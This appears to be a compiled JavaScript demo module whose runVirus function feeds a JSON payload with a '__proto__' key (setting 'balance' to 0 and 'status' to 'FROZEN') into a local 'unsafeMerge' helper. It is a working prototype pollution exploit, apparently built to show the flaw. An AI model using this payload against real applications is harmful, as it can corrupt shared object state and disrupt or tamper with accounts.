"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.runVirus = runVirus;
const merge_1 = require("./merge");
function runVirus() {
    const payload = JSON.parse(`
    {
      "__proto__": {
        "balance": 0,
        "status": "FROZEN"
      }
    }
  `);
    (0, merge_1.unsafeMerge)({}, payload);
}
